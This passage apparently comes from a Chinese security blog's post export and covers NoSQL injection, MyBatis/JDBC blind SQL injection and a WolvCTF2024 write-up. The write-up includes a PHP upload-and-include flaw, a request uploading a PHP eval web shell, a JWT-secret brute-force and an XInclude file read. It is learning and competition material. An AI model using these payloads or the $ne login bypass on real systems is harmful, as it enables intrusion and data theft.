href=\"https://blog.csdn.net/dyllove98/article/details/8990940\">查询操作符</a></p>\n<p>nosql的查询操作符不用<code>or、and、=</code>等等，取而代之的是<code>$eq、$ne、$gt</code>等</p>\n<table>\n<thead>\n<tr>\n<th>方法名</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>$gt</td>\n<td>大于</td>\n</tr>\n<tr>\n<td>$lte</td>\n<td>小于等于</td>\n</tr>\n<tr>\n<td>$in</td>\n<td>包含</td>\n</tr>\n<tr>\n<td>$nin</td>\n<td>不包含</td>\n</tr>\n<tr>\n<td>$lt</td>\n<td>小于</td>\n</tr>\n<tr>\n<td>$gte</td>\n<td>大于等于</td>\n</tr>\n<tr>\n<td>$ne</td>\n<td>不等于</td>\n</tr>\n<tr>\n<td>$eq</td>\n<td>等于</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>$and</th>\n<th>与</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>$nor</td>\n<td>$nor在NOR一个或多个查询表达式的数组上执行逻辑运算，并选择 对该数组中所有查询表达式都失败的文档</td>\n</tr>\n<tr>\n<td>$not</td>\n<td>反匹配(1.3.3及以上版本),字段值不匹配表达式或者字段值不存在</td>\n</tr>\n<tr>\n<td>$or</td>\n<td>或</td>\n</tr>\n</tbody></table>\n<p>例如：</p>\n<p>我们传入<code>username=admin&amp;password=123456</code></p>\n<p>后端就会处理成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">array(</span><br><span class=\"line\">&#x27;username&#x27; =&gt; &#x27;admin&#x27;,</span><br><span class=\"line\">&#x27;password&#x27; =&gt; &#x27;123456&#x27;</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n<p>如果我们传入<code>username[$ne]=1&amp;password[$ne]=1</code></p>\n<p>后端处理成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">array(</span><br><span class=\"line\">&#x27;username&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1),</span><br><span class=\"line\">&#x27;password&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1)</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n<p>查询的语句就会变成<code>db.users.find(&#123;&#39;username&#39;:&#123;$ne:1&#125;, &#39;password&#39;:&#123;$ne:1&#125;&#125;)</code></p>\n<p>意思就是查询username不等于1，password不等于1的用户</p>\n<p>此外,nosql还可以进行javascrip注入</p>\n<p>例如：<code>db.users.find( &#123; $where: function() &#123; return this.username == &#39;admin&#39;; &#125; &#125; )</code></p>\n<p>该查询返回在users集合中username等于admin的所有文档。</p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><a href=\"https://cloud.tencent.com/developer/article/1602092\">从零学习 NoSQL 注入之 Mongodb</a></p>\n<p><a href=\"https://tcm-sec.com/get-started-with-nosql-injection-nosqli/\">get-started-with-nosql-injection-nosqli</a></p>\n","categories":["web"],"tags":["web","sql"]},{"title":"java注入学习","url":"/2024/03/16/java%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/","content":"<h2 id=\"JDBC\"><a href=\"#JDBC\" class=\"headerlink\" title=\"JDBC\"></a>JDBC</h2><h3 id=\"JDBC是什么\"><a href=\"#JDBC是什么\" class=\"headerlink\" title=\"JDBC是什么\"></a>JDBC是什么</h3><p><strong>J</strong>ava <strong>D</strong>ata<strong>B</strong>ase <strong>C</strong>onnectivity（Java语言连接数据库）</p>\n<table>\n<thead>\n<tr>\n<th>接口或类</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>DriverManager类</strong></td>\n<td>1)管理和注册数据库驱动<br>2)得到数据库连接对象</td>\n</tr>\n<tr>\n<td><strong>Connection接口</strong></td>\n<td>一个连接对象，可用于创建Statement和PreparedStatement对象</td>\n</tr>\n<tr>\n<td><strong>Statemen接口</strong></td>\n<td>一个SQL语句对象，用于将SQL语句发送给数据库服务器</td>\n</tr>\n<tr>\n<td><strong>PreparedStetemen接口</strong></td>\n<td>一个SQL语句对象，是Statemen的子接口</td>\n</tr>\n<tr>\n<td><strong>ResultSet接口</strong></td>\n<td>用于封装数据库查询的结果集，返回给数据库Java程序</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>加载和注册驱动的方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Class.forName(数据库驱动实现类)</strong></td>\n<td>加载和注册数据库驱动，数据库驱动由mysql厂商”com.mysql.jbdc.Driver”</td>\n</tr>\n</tbody></table>\n<p>PrepareStatement会对SQL语句进行预编译，但如果直接采取拼接的方式构造SQL，此时进行预编译也无用。</p>\n<p>Statement不会对SQL语句进行预编译。</p>\n<p>两种操作都是因为SQL语句拼接导致的SQL注入。</p>\n<h2 id=\"MyBatis框架\"><a href=\"#MyBatis框架\" class=\"headerlink\" title=\"MyBatis框架\"></a>MyBatis框架</h2><p>在mybatis中的，使用<code>#</code>包裹的字段在内部进行了预编译处理，而<code>$</code>并没有使用预编译，也就是JDBC中prepareStatement和Statement的区别。mybatis的sql语句通常是写在xml文件中。</p>\n<h3 id=\"order-by-盲注\"><a href=\"#order-by-盲注\" class=\"headerlink\" title=\"order by 盲注\"></a>order by 盲注</h3><p>在SQL中是不允许union直接跟在order by后面的，所以我们可以考虑使用盲注或报错注入。</p>\n<p>我的理解就是通过order by将列进行排序，通过返回的不同结果</p>\n<p>举个简单的例子:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [test]&gt; select * from user order by (if(substr((select username from user limit 0,1),1,1)=&#x27;1&#x27;,sleep(1),1));</span><br><span class=\"line\">+------------------+------------+</span><br><span class=\"line\">| username         | password   |</span><br><span class=\"line\">+------------------+------------+</span><br><span class=\"line\">| Nakajima Ayato   | 9CXLGSEWDO |</span><br><span class=\"line\">| Mildred Green    | r8ZPbvDXBC |</span><br><span class=\"line\">| Ito Momoe        | qao7ysP90D |</span><br><span class=\"line\">| Lo On Kay        | x8rGVqTQqd |</span><br><span class=\"line\">| Kobayashi Sakura | lYiv7UO8Yo |</span><br><span class=\"line\">+------------------+------------+</span><br><span class=\"line\">5 rows in set (0.002 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [test]&gt; select * from user order by (if(substr((select username from user limit 0,1),1,1)=&#x27;N&#x27;,sleep(1),1));</span><br><span class=\"line\">+------------------+------------+</span><br><span class=\"line\">| username         | password   |</span><br><span class=\"line\">+------------------+------------+</span><br><span class=\"line\">| Nakajima Ayato   | 9CXLGSEWDO |</span><br><span class=\"line\">| Mildred Green    | r8ZPbvDXBC |</span><br><span class=\"line\">| Ito Momoe        | qao7ysP90D |</span><br><span class=\"line\">| Lo On Kay        | x8rGVqTQqd |</span><br><span class=\"line\">| Kobayashi Sakura | lYiv7UO8Yo |</span><br><span class=\"line\">+------------------+------------+</span><br><span class=\"line\">5 rows in set (5.004 sec)</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，当if语句成立时返回的时间为5s，但是不成立时为0.002s</p>\n<p>这是基于时间的盲注。</p>\n<p>还可以利用其它的方式来进行盲注</p>\n<p>例如：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [test]<span class=\"operator\">&gt;</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> if(substr((<span class=\"keyword\">select</span> username <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>)<span class=\"operator\">=</span><span class=\"string\">&#x27;a&#x27;</span>,<span class=\"number\">1</span>,(<span class=\"keyword\">select</span> host <span class=\"keyword\">from</span> mysql.user));</span><br><span class=\"line\">ERROR <span class=\"number\">1242</span> (<span class=\"number\">21000</span>): Subquery <span class=\"keyword\">returns</span> more than <span class=\"number\">1</span> <span class=\"type\">row</span></span><br></pre></td></tr></table></figure>\n\n<p>如果if语句错误就会返回<code>ERROR 1242 (21000): Subquery returns more than 1 row</code>，当if成立时就会返回正常页面，可以通过返回的情况来判断。</p>\n<h3 id=\"rand-盲注\"><a href=\"#rand-盲注\" class=\"headerlink\" title=\"rand()盲注\"></a>rand()盲注</h3><p>原理和order by大差不差，就是rand()会产生一个0-1之间的随机数，我们给一个固定的种子就会生成一个固定的数，所以我们控制rand的种子就可以造成排序的结果不同。</p>\n<p>比如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">rand(1)</span><br><span class=\"line\">rand(0)</span><br><span class=\"line\">rand(1=1)</span><br><span class=\"line\">rand(lenth(database())=8)</span><br><span class=\"line\">....</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"和-符号的区别\"><a href=\"#和-符号的区别\" class=\"headerlink\" title=\"#和$符号的区别\"></a>#和$符号的区别</h3><p><strong>#{}</strong> </p>\n<p>使用#{}意味着使用的预编译的语句，即在使用jdbc时的preparedStatement，sql语句中如果存在参数则会使用?作占位符，我们知道这种方式可以防止sql注入，并且在使用#{}时形成的sql语句，已经带有引号，例，select * from table1 where id=#{id} 在调用这个语句时我们可以通过后台看到打印出的sql为：select * from table1 where id=’2’ 加入传的值为2.也就是说在组成sql语句的时候把参数默认为字符串。</p>\n<p><strong>${}</strong></p>\n<p>使用${}时的sql不会当做字符串处理，是什么就是什么，如上边的语句：select * from table1 where id=${id} 在调用这个语句时控制台打印的为：select * from table1 where id=2 ，假设传的参数值为2</p>\n<p>从上边的介绍可以看出这两种方式的区别，我们最好是能用#{}则用它，因为它可以防止sql注入，且是预编译的，在需要原样输出时才使用${}，如，</p>\n<p>select * from ${tableName} order by ${id} 这里需要传入表名和按照哪个列进行排序 ，加入传入table1、id 则语句为：select * from table1 order by id</p>\n<p>如果是使用#{} 则变成了select * from ‘table1’ order by ‘id’ 我们知道这样就不对了。</p>\n<p>另，在使用以下的配置时，必须使用#{}</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;select id=&quot;selectMessageByIdI&quot; parameterType=&quot;int&quot; resultType=&quot;Message&quot;&gt;</span><br><span class=\"line\">         </span><br><span class=\"line\">         select * from message where id=#&#123;id&#125;;</span><br><span class=\"line\">     &lt;/select&gt;</span><br></pre></td></tr></table></figure>\n\n<p>在parameterType是int时，sql语句中必须是#{}。</p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p> <a href=\"https://www.freebuf.com/articles/web/360733.html\">关于Java中order by注入详解</a></p>\n","categories":["web","java"],"tags":["web","sql"]},{"title":"WolvCTF2024-复盘","url":"/2024/03/18/WolvCTF2024-%E5%A4%8D%E7%9B%98/","content":"<h2 id=\"Bean-Cafe\"><a href=\"#Bean-Cafe\" class=\"headerlink\" title=\"Bean Cafe\"></a>Bean Cafe</h2><p>他的验证逻辑是通过图片的md5的值来验证的，所以我们只需要传两张MD5相同的图片就可以获得flag</p>\n<p><a href=\"https://drive.google.com/drive/folders/1eCcMtQkHTreAJT6JmwxG10x1HbT6prY0\">https://drive.google.com/drive/folders/1eCcMtQkHTreAJT6JmwxG10x1HbT6prY0</a></p>\n<h2 id=\"Upload-Fun\"><a href=\"#Upload-Fun\" class=\"headerlink\" title=\"Upload Fun\"></a>Upload Fun</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REQUEST_METHOD&#x27;</span>] == <span class=\"string\">&quot;POST&quot;</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;f&quot;</span>][<span class=\"string\">&quot;size&quot;</span>] &gt; <span class=\"number\">1000</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;file too large&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">str_contains</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;f&quot;</span>][<span class=\"string\">&quot;name&quot;</span>], <span class=\"string\">&quot;..&quot;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;no .. in filename please&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;f&quot;</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;empty file&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$ip</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$flag</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&quot;/flag.txt&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$hash</span> = <span class=\"title function_ invoke__\">hash</span>(<span class=\"string\">&#x27;sha256&#x27;</span>, <span class=\"variable\">$flag</span> . <span class=\"variable\">$ip</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;f&quot;</span>][<span class=\"string\">&quot;tmp_name&quot;</span>], <span class=\"string\">&quot;./uploads/&quot;</span> . <span class=\"variable\">$hash</span> . <span class=\"string\">&quot;_&quot;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;f&quot;</span>][<span class=\"string\">&quot;name&quot;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;upload success&quot;</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;upload error&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;f&quot;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$path</span> = <span class=\"string\">&quot;./uploads/&quot;</span> . <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;f&quot;</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">str_contains</span>(<span class=\"variable\">$path</span>, <span class=\"string\">&quot;..&quot;</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;no .. in f please&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">include</span> <span class=\"variable\">$path</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&quot;index.php&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>首先分析一下源码，源码通过POST方式来上传文件并且上传的文件不能包含<code>..</code>用GET的方式来读取文件也不能带有<code>..</code>，上传的文件在<code>uploads</code>目录下，但是我们不知道<code>$hash</code>是什么。</p>\n<p>通过谷歌得知在linux种文件名的长度最大可为255个字符，我们可以通过这种方式让它报错来得知他的值</p>\n<p><img src=\"/./pic/WolvCTF2024/upload.png\"></p>\n<p>我们可以看到他的回显告诉我们了hash的值，然后我们再上传一句话木马访问即可。</p>\n<p>POST上传文件的请求体模板:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST / HTTP/2</span><br><span class=\"line\">Host: </span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;122&quot;, &quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;122&quot;</span><br><span class=\"line\">Sec-Ch-Ua-Mobile: ?0</span><br><span class=\"line\">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: https://0ad900b10331bc6f843fbff300b80018.web-security-academy.net</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylZktl8pLMuKyOfBy</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\">Sec-Fetch-Site: same-origin</span><br><span class=\"line\">Sec-Fetch-Mode: navigate</span><br><span class=\"line\">Sec-Fetch-User: ?1</span><br><span class=\"line\">Sec-Fetch-Dest: document</span><br><span class=\"line\">Accept-Encoding: gzip, deflate, br</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class=\"line\">Content-Length: 198</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundarylZktl8pLMuKyOfBy</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;&quot;; filename=&quot;&quot;</span><br><span class=\"line\">Content-Type: </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php eval($_POST[&#x27;1&#x27;])?&gt;</span><br><span class=\"line\">------WebKitFormBoundarylZktl8pLMuKyOfBy</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Username\"><a href=\"#Username\" class=\"headerlink\" title=\"Username\"></a>Username</h2><p>题目提示了jwt可以爆破，那这道题肯定和jwt伪造有关。</p>\n<p>用jwt-cracker爆破密钥，为<code>mstzt</code></p>\n<p>因为有<data>标签，所以判断为xxe注入，但是正常的xxe他会有过滤，不能引用东西。可以使用<code>XInclude attack</code>关于<a href=\"https://d0pt3x.gitbook.io/passion/webapp-security/xxe-attacks/xinclude-attacks\">XInclude attack</a></data></p>\n<p>读取/app/app.py文件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, render_template, request, url_for</span><br><span class=\"line\"><span class=\"keyword\">import</span> jwt</span><br><span class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> etree</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> tempfile</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">FLAG = os.environ.get(<span class=\"string\">&#x27;FLAG&#x27;</span>) <span class=\"keyword\">or</span> <span class=\"string\">&#x27;wcft&#123;fake-flag&#125;&#x27;</span></span><br><span class=\"line\">FLAGUSER_PASSWORD = os.environ.get(<span class=\"string\">&#x27;FLAGUSER_PASSWORD&#x27;</span>) <span class=\"keyword\">or</span> <span class=\"string\">&#x27;fake-password&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">JWT_SECRET = os.environ.get(<span class=\"string\">&#x27;JWT_SECRET&#x27;</span>) <span class=\"keyword\">or</span> <span class=\"string\">&#x27;secret&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">JWT_ALG = <span class=\"string\">&#x27;HS256&#x27;</span></span><br><span class=\"line\">JWT_COOKIE = <span class=\"string\">&#x27;appdata&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">root</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;index.html&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/secret-welcome-935734&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">secret_welcome</span>():</span><br><span class=\"line\">    <span class=\"comment\"># There is a linux user named &#x27;flaguser&#x27;</span></span><br><span class=\"line\">    <span class=\"comment\"># Login here with that username and their linux password.</span></span><br><span class=\"line\">    auth = request.authorization</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> auth <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">or</span> auth.username != <span class=\"string\">&#x27;flaguser&#x27;</span> <span class=\"keyword\">or</span> auth.password != FLAGUSER_PASSWORD:</span><br><span class=\"line\">        resp = flask.Response(<span class=\"string\">&#x27;Please provide the right credentials to get the flag&#x27;</span>)</span><br><span class=\"line\">        resp.headers[<span class=\"string\">&#x27;WWW-Authenticate&#x27;</span>] = <span class=\"string\">&#x27;Basic&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> resp, <span class=\"number\">401</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">f&#x27;Congrats, here is your flag: <span class=\"subst\">&#123;FLAG&#125;</span>&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/welcome&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">welcome</span>():</span><br><span class=\"line\">    cookie = request.cookies.get(JWT_COOKIE)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> cookie:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">f&#x27;Error: missing <span class=\"subst\">&#123;JWT_COOKIE&#125;</span> cookie value&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        jwtData = jwt.decode(cookie, JWT_SECRET, algorithms=[JWT_ALG])</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Error: unable to decode JWT cookie&#x27;</span>, <span class=\"number\">400</span></span><br><span class=\"line\"></span><br><span class=\"line\">    data = jwtData[<span class=\"string\">&#x27;data&#x27;</span>]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> data:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Error: missing data field from decoded JWT&#x27;</span>, <span class=\"number\">400</span></span><br><span class=\"line\"></span><br><span class=\"line\">    xmlText = <span class=\"built_in\">str</span>(data)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;&amp;&#x27;</span> <span class=\"keyword\">in</span> xmlText:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Error: No entity references please&#x27;</span>, <span class=\"number\">400</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;%&#x27;</span> <span class=\"keyword\">in</span> xmlText:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Error: No parameter file entities please&#x27;</span>, <span class=\"number\">400</span></span><br><span class=\"line\"></span><br><span class=\"line\">    tmp = tempfile.NamedTemporaryFile()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Open the file for writing.</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(tmp.name, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        f.write(xmlText)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        parser = etree.XMLParser(resolve_entities=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        xmlDoc = etree.parse(tmp.name, parser=parser)</span><br><span class=\"line\">        xmlDoc.xinclude()</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;XML Error:&#x27;</span>, e)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Error: Error parsing XML&#x27;</span>, <span class=\"number\">400</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    usernameElement = xmlDoc.find(<span class=\"string\">&#x27;username&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> usernameElement <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Error: Missing username element in XML&#x27;</span>, <span class=\"number\">400</span></span><br><span class=\"line\"></span><br><span class=\"line\">    username = usernameElement.text</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;welcome.html&quot;</span>, username=username)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/register&#x27;</span>, methods=[<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">register</span>():</span><br><span class=\"line\">    username = request.form.get(<span class=\"string\">&#x27;username&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> username:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Error: username is required&#x27;</span>, <span class=\"number\">400</span></span><br><span class=\"line\"></span><br><span class=\"line\">    username = <span class=\"built_in\">str</span>(username)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;^[a-z] $&#x27;</span>, username):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Error: username must be only lowercase letters&#x27;</span>, <span class=\"number\">400</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(username) &lt; <span class=\"number\">3</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Error: username must be at least 3 letters&#x27;</span>, <span class=\"number\">400</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(username) &gt; <span class=\"number\">20</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Error: username must be no longer than 20 letters&#x27;</span>, <span class=\"number\">400</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Useful for chal development</span></span><br><span class=\"line\">    <span class=\"comment\"># username = &#x27;&lt;xi:include xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot; href=&quot;/app/app.py&quot; parse=&quot;text&quot;/&gt;&#x27;</span></span><br><span class=\"line\">    xml = <span class=\"string\">f&#x27;&lt;data&gt;&lt;username&gt;<span class=\"subst\">&#123;username&#125;</span>&lt;/username&gt;&lt;/data&gt;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    jwtData = &#123;<span class=\"string\">&quot;data&quot;</span>: xml&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    cookie = jwt.encode(jwtData, JWT_SECRET, algorithm=JWT_ALG)</span><br><span class=\"line\"></span><br><span class=\"line\">    response = flask.make_response(<span class=\"string\">f&#x27;hello <span class=\"subst\">&#123;username&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    response.set_cookie(JWT_COOKIE, cookie)</span><br><span class=\"line\"></span><br><span class=\"line\">    response.headers[<span class=\"string\">&#x27;location&#x27;</span>] = url_for(<span class=\"string\">&#x27;welcome&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response, <span class=\"number\">302</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    app.run(debug=<span 